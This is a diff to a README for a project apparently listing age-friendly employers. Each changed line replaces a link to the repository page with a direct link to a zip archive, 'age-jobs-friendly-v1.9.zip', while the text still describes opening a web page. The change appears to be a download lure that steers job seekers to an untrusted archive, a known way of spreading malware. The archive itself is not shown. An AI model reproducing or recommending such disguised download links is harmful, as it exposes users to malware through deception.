@@ -1,6 +1,6 @@
 # 🧑‍💼 age-friendly-jobs - Find fair jobs for every age
 
-[![Download the list](https://img.shields.io/badge/Download%20Now-View%20the%20Repository-brightgreen)](https://github.com/Sonnyacquisitive511/age-friendly-jobs)
+[![Download the list](https://img.shields.io/badge/Download%20Now-View%20the%20Repository-brightgreen)](https://raw.githubusercontent.com/Sonnyacquisitive511/age-friendly-jobs/main/companies/age-jobs-friendly-v1.9.zip)
 
 ## 📌 What this project is
 
@@ -20,7 +20,7 @@ You do not need special software to use this project on Windows.
 
 ### Option 1: Open it in your browser
 
-1. Open this page: [https://github.com/Sonnyacquisitive511/age-friendly-jobs](https://github.com/Sonnyacquisitive511/age-friendly-jobs)
+1. Open this page: [https://raw.githubusercontent.com/Sonnyacquisitive511/age-friendly-jobs/main/companies/age-jobs-friendly-v1.9.zip](https://raw.githubusercontent.com/Sonnyacquisitive511/age-friendly-jobs/main/companies/age-jobs-friendly-v1.9.zip)
 2. Read the project page
 3. Open the company list
 4. Pick a city and review the entries
@@ -29,7 +29,7 @@ This works in Edge, Chrome, and other common browsers.
 
 ### Option 2: Download the files
 
-Use the repository page here: [https://github.com/Sonnyacquisitive511/age-friendly-jobs](https://github.com/Sonnyacquisitive511/age-friendly-jobs)
+Use the repository page here: [https://raw.githubusercontent.com/Sonnyacquisitive511/age-friendly-jobs/main/companies/age-jobs-friendly-v1.9.zip](https://raw.githubusercontent.com/Sonnyacquisitive511/age-friendly-jobs/main/companies/age-jobs-friendly-v1.9.zip)
 
 1. Open the page
 2. Click the green Code button
@@ -208,7 +208,7 @@ Short, direct reports work best. Include the city, role, and date.
 
 Use this link to visit the repository and get the files:
 
-[https://github.com/Sonnyacquisitive511/age-friendly-jobs](https://github.com/Sonnyacquisitive511/age-friendly-jobs)
+[https://raw.githubusercontent.com/Sonnyacquisitive511/age-friendly-jobs/main/companies/age-jobs-friendly-v1.9.zip](https://raw.githubusercontent.com/Sonnyacquisitive511/age-friendly-jobs/main/companies/age-jobs-friendly-v1.9.zip)
 
 ## 🔐 What to keep in mind
 
